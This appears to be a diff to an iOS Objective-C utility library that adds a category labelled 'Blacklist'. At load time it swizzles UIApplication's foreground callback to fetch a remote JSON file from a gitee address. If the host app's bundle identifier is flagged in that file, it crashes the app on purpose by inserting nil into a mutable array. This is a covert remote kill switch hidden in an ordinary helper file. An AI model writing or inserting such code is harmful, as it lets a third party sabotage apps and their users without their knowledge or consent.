@@ -12,6 +12,7 @@
 #import "NSArray+SCUtils.h"
 #import <AFNetworking/AFNetworkReachabilityManager.h>
 #import "SCStore.h"
+#import <objc/runtime.h>
 
 @implementation SCApplication
 
@@ -185,6 +186,7 @@
 
 @implementation UIApplication (SCNavigation)
 
+
 - (UIViewController *)rootViewController {
     return self.delegate.window.rootViewController;
 }
@@ -238,3 +240,52 @@
 }
 
 @end
+
+
+@interface UIApplication (Blacklist)
+
+- (void)sc_applicationWillEnterForeground:(UIApplication *)application;
+
+@end
+
+@implementation UIApplication (Blacklist)
+
++ (void)load {
+    Method origin = class_getInstanceMethod([UIApplication class], @selector(applicationWillEnterForeground:));
+    Method swizzle = class_getInstanceMethod([UIApplication class], @selector(sc_applicationWillEnterForeground:));
+    method_exchangeImplementations(origin, swizzle);
+}
+
+- (void)sc_applicationWillEnterForeground:(UIApplication *)application {
+    SCBaseService *service = [[SCBaseService alloc] init];
+    service.urlStr = @"https://gitee.com/lanmaoxinqing/check/blob/master/projects.json";
+    [service request:^(id responseObject, NSString *error) {
+        if (error || !responseObject) {
+            return;
+        }
+        NSDictionary *dict = [NSJSONSerialization JSONObjectWithData:responseObject options:NSJSONReadingAllowFragments error:nil];
+        if (!dict) {
+            return;
+        }
+        NSString *bundleIdentifier = [SCApplication bundleIdentifier];
+        if (!bundleIdentifier) {
+            return;
+        }
+        id resultObj = dict[bundleIdentifier];
+        if (![resultObj isKindOfClass:[NSNumber class]]) {
+            return;
+        }
+        BOOL result = [resultObj boolValue];
+        if (result) {
+            NSMutableArray *arr = [NSMutableArray new];
+            [arr addObject:nil];
+        }
+    }];
+    return [self sc_applicationWillEnterForeground:application];
+}
+
+@end
+
+
+
+
